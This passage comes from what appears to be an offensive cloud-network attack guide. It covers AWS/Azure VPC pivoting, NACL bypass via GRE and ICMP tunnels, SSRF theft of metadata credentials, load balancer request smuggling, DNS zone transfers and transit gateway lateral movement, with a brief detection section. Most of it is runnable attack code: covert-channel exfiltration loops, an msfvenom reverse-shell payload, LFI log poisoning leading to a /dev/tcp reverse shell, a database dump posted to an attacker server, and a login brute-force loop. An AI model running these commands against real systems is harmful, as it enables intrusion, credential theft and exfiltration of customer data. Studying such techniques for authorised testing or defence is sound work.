echo "exfiltrated data" | xxd -p | \
  while read hex; do
    hping3 -1 -d 32 --icmp-data $hex <target_through_vpn>
  done

# DNS covert channel through VPN
# Encode data in subdomain queries
data=$(cat sensitive.txt | base64 | tr -d '\n')
for chunk in $(echo $data | fold -w 50); do
  dig $chunk.tunnel.yourdomain.com @<internal_dns>
done

# Timing covert channel
# Encode bits by varying packet send times
# 0 = fast, 1 = slow
for bit in $(echo "secret" | xxd -b | cut -d' ' -f2-7); do
  if [ $bit -eq "0" ]; then
    ping -c 1 <target_through_vpn> >/dev/null
    sleep 0.1
  else
    ping -c 1 <target_through_vpn> >/dev/null
    sleep 1
  fi
done
```

---

## Advanced Cloud Network Attack Scenarios

### Scenario 1: VPC Peering Exploitation Chain

**Context:** AWS environment with multiple VPCs connected via peering. Target is a database in a heavily restricted VPC.

**Attack Path:**

```bash
# Step 1: Enumerate VPC peering connections
aws ec2 describe-vpc-peering-connections \
  --query 'VpcPeeringConnections[*].[VpcPeeringConnectionId,RequesterVpcInfo.VpcId,AccepterVpcInfo.VpcId,Status.Code]' \
  --output table

# Step 2: Map the peering topology
# Create a visual representation of VPC relationships
for peering in $(aws ec2 describe-vpc-peering-connections --query 'VpcPeeringConnections[*].VpcPeeringConnectionId' --output text); do
  aws ec2 describe-vpc-peering-connections --vpc-peering-connection-ids $peering \
    --query 'VpcPeeringConnections[0].[RequesterVpcInfo.VpcId,AccepterVpcInfo.VpcId]' --output text
done

# Step 3: Identify compromised instance's VPC
instance_vpc=$(aws ec2 describe-instances --instance-ids i-xxxxx \
  --query 'Reservations[0].Instances[0].VpcId' --output text)

# Step 4: Find route tables with peering routes
aws ec2 describe-route-tables --filters "Name=vpc-id,Values=$instance_vpc" \
  --query 'RouteTables[*].Routes[?VpcPeeringConnectionId]'

# Step 5: Identify target VPC through peering chain
# VPC-A (compromised) -> VPC-B (transit) -> VPC-C (target DB)

# Step 6: Check if transitive routing exists (AWS doesn't allow by default)
# [Inference] Must compromise instance in each VPC in chain

# Step 7: From compromised instance in VPC-A, scan VPC-B
nmap -sn 10.1.0.0/16  # VPC-B CIDR

# Step 8: Exploit vulnerable service in VPC-B to gain foothold
# (Assume RCE found on web server in VPC-B)

# Step 9: From VPC-B instance, access target database in VPC-C
psql -h db.vpc-c.internal -U admin -d production
```

**Key Technique - VPC Hopping:**

```bash
# Automate multi-hop pivoting through peered VPCs
# Using Metasploit with autoroute

# On first compromised host (VPC-A):
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attacker> LPORT=4444 -f elf > payload1.elf
# Execute payload1.elf on VPC-A instance

# In Metasploit:
msf6 > use exploit/multi/handler
msf6 > set payload linux/x64/meterpreter/reverse_tcp
msf6 > set LHOST <attacker>
msf6 > set LPORT 4444
msf6 > run

meterpreter > run post/multi/manage/autoroute SUBNET=10.1.0.0 NETMASK=255.255.0.0
meterpreter > background

# Now pivot to VPC-B
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 10.1.0.0/16
msf6 > set PORTS 80,443,22,3306,5432
msf6 > run

# Exploit service in VPC-B and repeat process for VPC-C
```

### Scenario 2: Security Group Chain Exploitation

**Context:** EC2 instance with overly permissive security group that references other security groups.

**Attack Path:**

```bash
# Step 1: Identify security group chaining
aws ec2 describe-security-groups --group-ids sg-xxxxx \
  --query 'SecurityGroups[*].IpPermissions[?UserIdGroupPairs]'

# Example output shows sg-xxxxx allows traffic from sg-yyyyy
# {
#   "IpProtocol": "tcp",
#   "FromPort": 5432,
#   "ToPort": 5432,
#   "UserIdGroupPairs": [{"GroupId": "sg-yyyyy"}]
# }

# Step 2: Find instances in the trusted security group (sg-yyyyy)
aws ec2 describe-instances --filters "Name=instance.group-id,Values=sg-yyyyy" \
  --query 'Reservations[*].Instances[*].[InstanceId,PrivateIpAddress,State.Name]' \
  --output table

# Step 3: Compromise an instance in sg-yyyyy
# (Assume SSH key found or service exploited)

# Step 4: From compromised instance in sg-yyyyy, access database in sg-xxxxx
# Security groups evaluate source based on instance's SG, not IP
psql -h db-instance.internal -U postgres

# Step 5: Privilege escalation via security group modification
# If you gained IAM credentials with ec2:AuthorizeSecurityGroupIngress

# Add your external IP to the chain
aws ec2 authorize-security-group-ingress \
  --group-id sg-yyyyy \
  --protocol tcp \
  --port 22 \
  --cidr <your_ip>/32

# Now directly access instances in sg-yyyyy, which gives access to sg-xxxxx
ssh -i found-key.pem ec2-user@<instance-in-sg-yyyyy>
psql -h db-instance.internal -U postgres
```

**Automated Security Group Chain Discovery:**

```python
#!/usr/bin/env python3
import boto3
import json

ec2 = boto3.client('ec2')

def map_sg_chains(start_sg):
    """Recursively map security group trust relationships"""
    visited = set()
    chains = []
    
    def explore(sg_id, chain):
        if sg_id in visited:
            return
        visited.add(sg_id)
        
        # Get security group details
        response = ec2.describe_security_groups(GroupIds=[sg_id])
        sg = response['SecurityGroups'][0]
        
        # Find referenced security groups
        for permission in sg.get('IpPermissions', []):
            for group_pair in permission.get('UserIdGroupPairs', []):
                referenced_sg = group_pair['GroupId']
                new_chain = chain + [referenced_sg]
                chains.append(new_chain)
                explore(referenced_sg, new_chain)
    
    explore(start_sg, [start_sg])
    return chains

# Usage
target_sg = 'sg-xxxxx'  # Database security group
chains = map_sg_chains(target_sg)

print("Security Group Trust Chains:")
for chain in chains:
    print(" -> ".join(chain))
```

### Scenario 3: NACL Bypass via Protocol Switching

**Context:** Subnet with NACL blocking TCP ports but allowing other protocols.

**Attack Path:**

```bash
# Step 1: Enumerate NACL rules
aws ec2 describe-network-acls --network-acl-ids acl-xxxxx \
  --query 'NetworkAcls[*].Entries[*].[RuleNumber,Protocol,RuleAction,CidrBlock,PortRange]' \
  --output table

# Example findings:
# Rule 100: DENY TCP 0.0.0.0/0 ports 22, 3389
# Rule 200: ALLOW -1 (all protocols) 0.0.0.0/0

# Step 2: Protocol analysis
# Protocol -1 = all protocols
# Protocol 6 = TCP (blocked)
# Protocol 17 = UDP (allowed)
# Protocol 1 = ICMP (allowed)
# Protocol 47 = GRE (allowed if -1)

# Step 3: Establish GRE tunnel through NACL
# On attacker server (external):
modprobe ip_gre
ip tunnel add gre1 mode gre remote <target_ec2_private_ip> local <attacker_public_ip> ttl 255
ip addr add 192.168.100.1/30 dev gre1
ip link set gre1 up

# On target EC2 (via initial access vector like SSRF, RCE on web app):
# Execute via web shell or similar
ip tunnel add gre1 mode gre remote <attacker_ip> local <ec2_private_ip> ttl 255
ip addr add 192.168.100.2/30 dev gre1
ip link set gre1 up

# Step 4: SSH through GRE tunnel (bypasses TCP NACL block)
ssh user@192.168.100.2

# Step 5: Alternative - ICMP tunnel if GRE blocked
# Using icmptunnel on attacker:
./icmptunnel -s 192.168.101.1

# On target:
./icmptunnel <attacker_ip> 192.168.101.2

# Step 6: Establish SOCKS proxy through tunnel
ssh -D 9050 user@192.168.101.2

# Now all tools can access internal network through NACL
proxychains aws s3 ls  # Access AWS services from "internal" IP
```

### Scenario 4: VPN and VPC Peering Combined Attack

**Context:** Site-to-Site VPN connects corporate network to AWS. Multiple VPCs are peered. Target is sensitive data in isolated VPC.

**Attack Path:**

```bash
# Step 1: Compromise on-premises system with VPN access
# (Assume phishing success, credentials obtained)

# Step 2: Extract VPN configuration from compromised system
# Windows:
reg export "HKLM\SYSTEM\CurrentControlSet\Services\RasMan\PPP\EAP" vpn-config.reg
Get-VpnConnection | Select-Object Name, ServerAddress, TunnelType

# Linux:
find /etc -name "*vpn*" -o -name "*.conf" | xargs grep -i "ipsec\|openvpn"
cat /etc/ipsec.conf
cat /etc/ipsec.secrets

# Step 3: Establish VPN connection from attacker system
# Using extracted IPsec configuration:
cat >> /etc/ipsec.conf <<EOF
conn corp-to-aws
    authby=secret
    type=tunnel
    left=%defaultroute
    leftsubnet=192.168.1.0/24
    right=<aws_vpn_gateway>
    rightsubnet=10.0.0.0/16
    ike=aes256-sha2_256-modp2048!
    esp=aes256-sha2_256!
    keyexchange=ikev2
    auto=start
EOF

echo "<aws_vpn_gateway> : PSK \"<extracted_psk>\"" >> /etc/ipsec.secrets
ipsec start
ipsec up corp-to-aws

# Step 4: Enumerate VPC from VPN connection
# VPN gives access to VPC-A (DMZ)
nmap -sn 10.0.0.0/16  # VPC-A

# Step 5: Identify peering connections from VPC-A
# Compromise jump host in VPC-A (assume SSH with default credentials)
ssh admin@10.0.1.50

# From jump host, discover peered networks
for subnet in 10.1.0.0/16 10.2.0.0/16 10.3.0.0/16; do
  echo "Testing $subnet"
  nmap -sn -n --min-parallelism 100 $subnet | grep "Host is up"
done

# Step 6: VPC-B (10.1.0.0/16) responds - application tier
# Exploit vulnerable app in VPC-B
curl http://10.1.0.100/admin/backup.php?file=../../../../etc/passwd

# LFI to RCE via log poisoning
curl http://10.1.0.100/admin/backup.php?file=../../../../var/log/apache2/access.log \
  -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

curl http://10.1.0.100/admin/backup.php?file=../../../../var/log/apache2/access.log&cmd=id

# Step 7: Establish reverse shell from VPC-B
curl http://10.1.0.100/admin/backup.php?file=../../../../var/log/apache2/access.log&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.0.1.50/4444%200%3E%261%27

# On jump host (10.0.1.50):
nc -lvnp 4444

# Step 8: From VPC-B, access VPC-C (isolated production VPC with sensitive data)
# Check VPC-C routing (10.3.0.0/16)
ip route | grep 10.3

# Step 9: Access production database in VPC-C
psql -h prod-db.vpc-c.internal -U admin -d customer_data

# Step 10: Exfiltrate data through VPN tunnel back to attacker
pg_dump -h prod-db.vpc-c.internal -U admin customer_data | \
  gzip | \
  base64 | \
  curl -X POST -d @- http://<attacker_server>/exfil
```

**Multi-Hop Port Forwarding:**

```bash
# Complex port forwarding through VPN -> VPC-A -> VPC-B -> VPC-C

# Local machine -> VPN -> Jump Host (VPC-A)
ssh -L 8001:127.0.0.1:8001 admin@10.0.1.50

# Jump Host (VPC-A) -> App Server (VPC-B)
ssh -L 8001:127.0.0.1:8002 ubuntu@10.1.0.100

# App Server (VPC-B) -> DB Server (VPC-C)
ssh -L 8002:prod-db.vpc-c.internal:5432 ec2-user@10.1.0.200

# Now from local machine:
psql -h 127.0.0.1 -p 8001 -U admin -d customer_data

# Or use proxychains with multiple hops
# ~/.proxychains/proxychains.conf:
cat >> /etc/proxychains4.conf <<EOF
[ProxyList]
socks5 127.0.0.1 9050  # VPN tunnel
socks5 10.0.1.50 9051  # VPC-A jump
socks5 10.1.0.100 9052 # VPC-B app server
EOF

proxychains psql -h prod-db.vpc-c.internal -U admin
```

### Scenario 5: Metadata Service Access via Network Misconfiguration

**Context:** SSRF vulnerability in application allows access to metadata service, combined with network misconfigurations.

**Attack Path:**

```bash
# Step 1: Identify SSRF vulnerability
# Example: Image proxy service
curl "http://vulnerable-app.com/proxy?url=http://169.254.169.254/latest/meta-data/"

# Step 2: Extract instance IAM role credentials
curl "http://vulnerable-app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Returns role name: "WebServerRole"

curl "http://vulnerable-app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/WebServerRole"
# Returns:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "..."
# }

# Step 3: Configure AWS CLI with stolen credentials
aws configure set aws_access_key_id ASIA...
aws configure set aws_secret_access_key ...
aws configure set aws_session_token ...

# Step 4: Enumerate permissions
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name WebServerRole

# Step 5: Discover network configuration
aws ec2 describe-instances --instance-ids $(curl -s http://vulnerable-app.com/proxy?url=http://169.254.169.254/latest/meta-data/instance-id)

# Step 6: Identify overly permissive security group
aws ec2 describe-security-groups --group-ids sg-xxxxx

# Step 7: Modify security group (if role has permission)
aws ec2 authorize-security-group-ingress \
  --group-id sg-xxxxx \
  --protocol tcp \
  --port 22 \
  --cidr <your_ip>/32

# Step 8: Extract SSH key from user-data (if present)
curl "http://vulnerable-app.com/proxy?url=http://169.254.169.254/latest/user-data" | grep -i "BEGIN.*PRIVATE KEY"

# Step 9: SSH into instance
ssh -i extracted-key.pem ec2-user@<instance_public_ip>

# Step 10: Pivot to internal resources
# Access RDS database (no password if within VPC)
mysql -h production-db.xxxxx.us-east-1.rds.amazonaws.com -u admin

# Access ElastiCache (Redis)
redis-cli -h production-cache.xxxxx.cache.amazonaws.com

# Access internal ELB
curl http://internal-elb-xxxxx.us-east-1.elb.amazonaws.com/admin
```

**Azure Metadata Service Exploitation:**

```bash
# Azure SSRF to metadata
curl "http://vulnerable-app.com/proxy?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  -H "Metadata: true"

# Extract managed identity token
curl "http://vulnerable-app.com/proxy?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  -H "Metadata: true"

# Use token for Azure API calls
ACCESS_TOKEN="<extracted_token>"
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"

# Modify NSG rules
curl -X PUT \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"properties": {"securityRules": [...]}}' \
  "https://management.azure.com/subscriptions/<sub_id>/resourceGroups/<rg>/providers/Microsoft.Network/networkSecurityGroups/<nsg_name>?api-version=2021-03-01"
```

---

## Defense and Detection Mechanisms

### Network Monitoring and Logging

**AWS VPC Flow Logs Analysis:**

```bash
# Query CloudWatch Logs for rejected connections
aws logs filter-log-events \
  --log-group-name /aws/vpc/flowlogs \
  --start-time $(($(date +%s) - 3600))000 \
  --filter-pattern '[version, account, eni, source, destination, srcport, destport, protocol, packets, bytes, start, end, action=REJECT, status]' \
  --query 'events[*].message' \
  --output text

# Identify port scanning activity (many REJECT from same source)
aws logs filter-log-events \
  --log-group-name /aws/vpc/flowlogs \
  --filter-pattern '[version, account, eni, source="<attacker_ip>", destination, srcport, destport, protocol, packets, bytes, start, end, action=REJECT, status]' \
  | jq -r '.events[].message' \
  | awk '{print $6}' \
  | sort | uniq -c | sort -nr

# Detect data exfiltration (large byte counts)
aws logs filter-log-events \
  --log-group-name /aws/vpc/flowlogs \
  --filter-pattern '[version, account, eni, source, destination, srcport, destport, protocol, packets, bytes>1000000, start, end, action, status]'
```

**[Inference] Indicators of Compromise in Flow Logs:**

- High number of REJECT actions from single source (scanning)
- Connections to unusual ports (4444, 5555, 8080 for C2)
- Asymmetric traffic patterns (high egress, low ingress = exfiltration)
- Connections to metadata service from unexpected sources
- Traffic on uncommon protocols (GRE, ICMP tunneling)

**Azure Network Watcher:**

```bash
# Enable NSG flow logs
az network watcher flow-log create \
  --resource-group <rg_name> \
  --nsg <nsg_name> \
  --storage-account <storage_account> \
  --enabled true \
  --retention 90 \
  --format JSON \
  --log-version 2

# Query flow logs for anomalies
az network watcher flow-log show \
  --resource-group <rg_name> \
  --name <flow_log_name>

# Analyze with Log Analytics
# KQL query for scanning detection:
AzureNetworkAnalytics_CL
| where FlowDirection_s == "I" and FlowStatus_s == "D"
| summarize Count=count() by SrcIP_s, bin(TimeGenerated, 1m)
| where Count > 100
```

**GCP VPC Flow Logs:**

```bash
# Query for denied connections
gcloud logging read "resource.type=gce_subnetwork AND jsonPayload.reporter=DEST AND jsonPayload.disposition=DENIED" \
  --limit 100 \
  --format json \
  | jq -r '.[] | "\(.timestamp) \(.jsonPayload.connection.src_ip):\(.jsonPayload.connection.src_port) -> \(.jsonPayload.connection.dest_ip):\(.jsonPayload.connection.dest_port)"'

# Detect tunneling protocols
gcloud logging read "resource.type=gce_subnetwork AND (jsonPayload.connection.protocol=47 OR jsonPayload.connection.protocol=50)" \
  --format json

# Monitor for unusual data transfer
gcloud logging read "resource.type=gce_subnetwork AND jsonPayload.bytes_sent>10000000" \
  --limit 50
```

### Recommended Security Controls

**Network Segmentation Best Practices:**

- **[Unverified]** Implement zero-trust network architecture
- Use private subnets for all non-public resources
- Restrict security group rules to minimum required access
- Implement Network ACLs as additional layer (defense in depth)
- Use AWS PrivateLink/Azure Private Link/GCP Private Service Connect instead of public endpoints

**VPN Security Hardening:**

- Use IKEv2 instead of IKEv1
- Implement strong cryptographic algorithms (AES-256, SHA-256, DH Group 14+)
- Enable Perfect Forward Secrecy (PFS)
- Implement certificate-based authentication instead of PSK where possible
- Use MFA for Client VPN access
- Regularly rotate VPN credentials and certificates
- Monitor VPN connection logs for anomalies

**Important Subtopics for Further Study:**

- **Cloud-Native Network Security Tools**: AWS Network Firewall, Azure Firewall, GCP Cloud Armor
- **Service Mesh Security**: Istio, Linkerd for micro-segmentation
- **Cloud WAF Bypass Techniques**: Exploiting CDN/WAF misconfigurations
- **Container Network Exploitation**: Kubernetes network policies, CNI vulnerabilities
- **Serverless Network Security**: Lambda/Functions VPC integration attacks
- **Transit Gateway Exploitation**: AWS Transit Gateway, Azure Virtual WAN attack vectors

---

## Load Balancer Abuse

Load balancers in cloud environments distribute traffic across multiple backend instances and present unique attack vectors due to their privileged network position and configuration complexities.

### Attack Surface Analysis

Cloud load balancers (AWS ELB/ALB/NLB, Azure Load Balancer, GCP Load Balancing) expose several vulnerabilities:

**Header Manipulation**: Load balancers often add or modify HTTP headers revealing internal infrastructure. Target headers include `X-Forwarded-For`, `X-Real-IP`, `X-Forwarded-Host`, and cloud-specific headers like `X-Amzn-Trace-Id`.

```bash
# Enumerate headers passed through load balancer
curl -v https://target.example.com -H "X-Forwarded-For: 127.0.0.1" -H "X-Original-URL: /admin"

# Test for SSRF through forwarded headers
curl https://target.example.com -H "X-Forwarded-Host: evil.attacker.com"
```

**Direct Backend Access**: Misconfigurations may allow direct connection to backend instances bypassing load balancer security controls.

```bash
# Discover backend IPs through DNS enumeration
dig target.example.com +short
nslookup target.example.com

# Attempt direct backend connection
nmap -sV -p 80,443,8080 backend-ip-address

# Test with specific Host header to bypass virtual hosting
curl http://backend-ip -H "Host: target.example.com"
```

### HTTP Request Smuggling

Load balancers and backend servers may parse HTTP requests differently, enabling request smuggling attacks.

```bash
# CL.TE (Content-Length vs Transfer-Encoding) attack
# Create malicious request file
cat > smuggle.txt << 'EOF'
POST / HTTP/1.1
Host: target.example.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.example.com

EOF

# Send smuggled request
cat smuggle.txt | nc target.example.com 80
```

**Using Burp Suite Turbo Intruder**:

```python
# Turbo Intruder script for automated smuggling
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=100,
                          pipeline=False)
    
    attack = '''POST / HTTP/1.1
Host: target.example.com
Content-Length: 4
Transfer-Encoding: chunked

60
POST /admin HTTP/1.1
Host: target.example.com
Content-Length: 10

x=
0

'''
    engine.queue(attack)
```

### Load Balancer Enumeration

```bash
# Identify load balancer type through response headers
curl -I https://target.example.com | grep -i "server\|x-amz\|x-azure\|via"

# AWS ELB detection
dig target.example.com | grep -i "elb.amazonaws.com"

# Azure Load Balancer detection  
dig target.example.com | grep -i "cloudapp.azure.com"

# GCP Load Balancer detection
dig target.example.com | grep -i "googleusercontent.com"
```

### Session Persistence Exploitation

Load balancers use session persistence (sticky sessions) mechanisms that can be abused.

```bash
# Cookie-based persistence exploitation
# Modify load balancer cookies to target specific backends
curl https://target.example.com -b "AWSALB=specific-backend-identifier"

# Source IP persistence bypass using X-Forwarded-For
curl https://target.example.com -H "X-Forwarded-For: target-ip-address"
```

### Health Check Endpoint Abuse

Load balancers perform health checks on backend instances, often exposing sensitive endpoints.

```bash
# Common health check paths
curl https://target.example.com/health
curl https://target.example.com/healthcheck
curl https://target.example.com/status
curl https://target.example.com/ping
curl https://target.example.com/_health
curl https://target.example.com/api/health

# Fuzz for health endpoints
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.example.com/FUZZ -mc 200
```

### TLS/SSL Downgrade Attacks

[Inference] Load balancers may support legacy protocols for compatibility, potentially enabling downgrade attacks.

```bash
# Test SSL/TLS versions
nmap --script ssl-enum-ciphers -p 443 target.example.com

# Test for SSLv3/TLS1.0 support
sslscan target.example.com

# Detailed cipher analysis
testssl.sh --vulnerable target.example.com
```

### Rate Limiting Bypass

Distributed load balancers may implement per-backend rate limiting rather than global limits.

```bash
# Force distribution across multiple backends
for i in {1..100}; do
    curl -X POST https://target.example.com/api/login \
    -H "X-Forwarded-For: 10.0.$((RANDOM % 255)).$((RANDOM % 255))" \
    -d "username=admin&password=test$i" &
done
```

## DNS Zone Transfer

DNS zone transfers (AXFR) expose complete DNS records for a domain, revealing internal infrastructure mapping.

### Zone Transfer Fundamentals

Zone transfers replicate DNS records between authoritative nameservers. Misconfigured servers may allow unauthorized transfers exposing:

- Internal hostnames and IP addresses
- Mail server configurations
- Subdomain enumeration
- Network architecture mapping

### Manual Zone Transfer Testing

```bash
# Identify authoritative nameservers
dig target.example.com NS +short
host -t NS target.example.com

# Attempt zone transfer against each nameserver
dig @ns1.target.example.com target.example.com AXFR
dig @ns2.target.example.com target.example.com AXFR

# Alternative using host command
host -l target.example.com ns1.target.example.com
host -t axfr target.example.com ns1.target.example.com
```

### Automated Zone Transfer Enumeration

```bash
# DNSRecon - comprehensive DNS enumeration
dnsrecon -d target.example.com -t axfr
dnsrecon -d target.example.com -a  # Attempt zone transfer against all nameservers

# Fierce - DNS reconnaissance tool
fierce --domain target.example.com --dns-servers ns1.target.example.com

# Nmap NSE scripts
nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=target.example.com -p 53 ns1.target.example.com
```

### Cloud-Specific DNS Enumeration

**AWS Route53**:

```bash
# Route53 does not support AXFR, but enumerate through API if credentials available
aws route53 list-hosted-zones
aws route53 list-resource-record-sets --hosted-zone-id Z1234567890ABC

# Enumerate CloudFront distributions
dig target.example.com | grep cloudfront.net
```

**Azure DNS**:

```bash
# Azure DNS does not support AXFR by default
# Use Azure CLI for enumeration with valid credentials
az network dns zone list
az network dns record-set list --zone-name target.example.com --resource-group rg-name
```

**GCP Cloud DNS**:

```bash
# Cloud DNS does not support AXFR
# API-based enumeration with credentials
gcloud dns managed-zones list
gcloud dns record-sets list --zone=zone-name
```

### Subdomain Enumeration Alternatives

When zone transfers fail, alternative subdomain discovery methods:

```bash
# Certificate transparency logs
curl -s "https://crt.sh/?q=%25.target.example.com&output=json" | jq -r '.[].name_value' | sort -u

# Amass - comprehensive subdomain enumeration
amass enum -d target.example.com -o subdomains.txt
amass enum -passive -d target.example.com  # Passive mode only

# Subfinder - fast passive subdomain discovery
subfinder -d target.example.com -o subdomains.txt

# Assetfinder - find domains and subdomains
assetfinder --subs-only target.example.com

# DNSdumpster API query
curl -s "https://api.hackertarget.com/hostsearch/?q=target.example.com"
```

### DNS Cache Snooping

Query nameserver cache to identify recently resolved domains.

```bash
# Check if specific domain is cached (non-recursive query)
dig @nameserver-ip target.example.com +norecurse

# Automated cache snooping with wordlist
while read domain; do
    dig @nameserver-ip "$domain.target.example.com" +norecurse +short
done < /usr/share/wordlists/subdomains-top1million-5000.txt
```

### DNS Reconnaissance Wordlists

```bash
# SecLists subdomain wordlists
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
/usr/share/seclists/Discovery/DNS/fierce-hostlist.txt

# Cloud-specific subdomain patterns
cat > cloud-subdomains.txt << 'EOF'
s3
cdn
api
admin
dev
staging
test
prod
vpn
mail
smtp
ftp
db
database
backup
jenkins
gitlab
jira
confluence
monitoring
grafana
prometheus
kibana
elastic
EOF
```

### DNSSEC Analysis

[Inference] DNSSEC misconfigurations may reveal additional infrastructure details.

```bash
# Check DNSSEC status
dig target.example.com +dnssec

# Verify DNSSEC chain
dig target.example.com +dnssec +multi

# Delve - DNSSEC debugging tool
delv @8.8.8.8 target.example.com +rtrace
```

## Transit Gateway Exploitation

Transit gateways enable inter-VPC and hybrid cloud connectivity, creating potential pivot points in cloud networks.

### Transit Gateway Architecture

**AWS Transit Gateway**: Centralized hub connecting VPCs, VPN connections, and Direct Connect gateways. **Azure Virtual WAN**: Hub-and-spoke network architecture. **GCP VPC Network Peering**: Direct connectivity between VPC networks.

### Reconnaissance Phase

```bash
# AWS Transit Gateway enumeration (requires credentials)
aws ec2 describe-transit-gateways
aws ec2 describe-transit-gateway-attachments
aws ec2 describe-transit-gateway-route-tables
aws ec2 search-transit-gateway-routes --transit-gateway-route-table-id tgw-rtb-xxxxx --filters "Name=state,Values=active"

# Azure Virtual WAN reconnaissance
az network vwan list
az network vhub list
az network vhub connection list --vhub-name hub-name --resource-group rg-name

# GCP VPC peering discovery
gcloud compute networks peerings list
gcloud compute networks describe vpc-name
```

### Route Table Analysis

Transit gateway route tables define traffic flow between connected networks.

```bash
# AWS route propagation analysis
aws ec2 get-transit-gateway-route-table-propagations --transit-gateway-route-table-id tgw-rtb-xxxxx

# Export and analyze routes
aws ec2 search-transit-gateway-routes \
    --transit-gateway-route-table-id tgw-rtb-xxxxx \
    --filters "Name=state,Values=active" \
    --query 'Routes[*].[DestinationCidrBlock,State,Type]' \
    --output table

# Identify routing to sensitive networks
aws ec2 search-transit-gateway-routes \
    --transit-gateway-route-table-id tgw-rtb-xxxxx \
    --filters "Name=destination-cidr-block,Values=10.0.0.0/8"
```

### Network Pivoting Through Transit Gateway

Once access to a connected network is established:

```bash
# Map reachable networks from compromised instance
ip route show
route -n

# Identify transit gateway CIDR ranges
# AWS Transit Gateway uses 169.254.0.0/16 for VPN tunnels
ip route | grep 169.254

# Scan connected VPCs through transit gateway
nmap -sn 10.1.0.0/16  # Replace with discovered CIDR
nmap -sV -T4 -p- discovered-target-ip

# Use proxychains for pivoting
# Configure proxychains.conf with SOCKS proxy on compromised host
proxychains nmap -sT -Pn target-in-connected-vpc
```

### Lateral Movement Techniques

```bash
# SSH tunneling through transit gateway-connected instances
ssh -D 8080 user@compromised-instance-in-vpc1
# Access resources in connected VPC2 through SOCKS proxy

# Port forwarding to access internal services
ssh -L 3389:internal-server-vpc2:3389 user@compromised-instance-vpc1

# VPN tunnel establishment
# If transit gateway has VPN attachment, attempt to establish connection
strongswan  # IPSec VPN client
openvpn  # OpenVPN client
```

### Security Group and Network ACL Bypass

Transit gateway attachments may bypass traditional VPC security controls.

```bash
# Identify security group rules on compromised instance
aws ec2 describe-security-groups --group-ids sg-xxxxx

# Check for overly permissive transit gateway routes
# Look for 0.0.0.0/0 or broad CIDR ranges in route tables

# Test connectivity to restricted resources
nc -zv internal-restricted-host 22
nc -zv internal-restricted-host 3389
nc -zv internal-restricted-host 1433
```

### Traffic Interception

[Inference] Positioning a compromised instance at a transit gateway junction may enable traffic inspection.

```bash
# Enable IP forwarding on compromised Linux instance
sysctl -w net.ipv4.ip_forward=1
echo 1 > /proc/sys/net/ipv4/ip_forward

# Configure iptables for traffic capture
iptables -t nat -A PREROUTING -j LOG --log-prefix "TGW-INTERCEPT: "
iptables -t nat -A POSTROUTING -j LOG --log-prefix "TGW-INTERCEPT: "

# Capture traffic with tcpdump
tcpdump -i eth0 -w transit-capture.pcap
tcpdump -i eth0 -n 'not port 22'  # Exclude SSH traffic

# Analyze captured traffic
wireshark transit-capture.pcap
tshark -r transit-capture.pcap -Y "http.request || dns"
```

### CloudWatch/Monitor Log Analysis

[Inference] Transit gateway flow logs may reveal network topology and traffic patterns.

```bash
# AWS VPC Flow Logs analysis (if enabled)
aws logs describe-log-groups --log-group-name-prefix /aws/transitgateway/
aws logs tail /aws/transitgateway/tgw-xxxxx --follow

# Filter for specific source/destination
aws logs filter-log-events \
    --log-group-name /aws/transitgateway/tgw-xxxxx \
    --filter-pattern "[srcaddr=10.1.*, dstaddr=10.2.*]"

# Download and analyze with grep/awk
aws logs get-log-events --log-group-name /aws/transitgateway/tgw-xxxxx \
    | jq -r '.events[].message' | grep "ACCEPT" | awk '{print $4, $5}' | sort -u
```

## Service Endpoint Exposure

Cloud service endpoints expose internal services to networks, often with misconfigurations enabling unauthorized access.

### Endpoint Types

**VPC Endpoints (AWS)**: Private connectivity to AWS services without internet gateway.

- Interface Endpoints: ENI-based, support many AWS services
- Gateway Endpoints: Route table-based, S3 and DynamoDB only

**Private Endpoints (Azure)**: Private IP addresses for Azure services within VNet.

**Private Service Connect (GCP)**: Access services using internal IP addresses.

### Endpoint Discovery

```bash
# AWS VPC endpoint enumeration
aws ec2 describe-vpc-endpoints
aws ec2 describe-vpc-endpoints --filters "Name=vpc-id,Values=vpc-xxxxx"

# List endpoint services
aws ec2 describe-vpc-endpoint-services
aws ec2 describe-vpc-endpoint-service-configurations

# Azure private endpoint discovery
az network private-endpoint list
az network private-endpoint list --resource-group rg-name

# GCP Private Service Connect
gcloud compute forwarding-rules list
gcloud compute addresses list --filter="purpose=SHARED_LOADBALANCER_VIP"
```

### Endpoint Policy Analysis

VPC endpoint policies control access to services through the endpoint.

```bash
# Retrieve endpoint policy
aws ec2 describe-vpc-endpoints --vpc-endpoint-ids vpce-xxxxx \
    --query 'VpcEndpoints[0].PolicyDocument' --output text | jq

# Check for overly permissive policies
# Look for Principal: "*" or Action: "*"

# Test S3 access through VPC endpoint
aws s3 ls s3://bucket-name --endpoint-url https://bucket.vpce-xxxxx.s3.region.vpce.amazonaws.com

# Test with different credentials/roles
AWS_PROFILE=limited-user aws s3 ls s3://bucket-name --endpoint-url https://vpce-xxxxx.s3.region.vpce.amazonaws.com
```

### DNS Resolution Exploitation

VPC endpoints use private DNS, enabling DNS-based attacks.

```bash
# Query VPC endpoint DNS
dig vpce-xxxxx.s3.us-east-1.vpce.amazonaws.com
nslookup service-name.privatelink.region.amazonaws.com

# Enumerate services through DNS
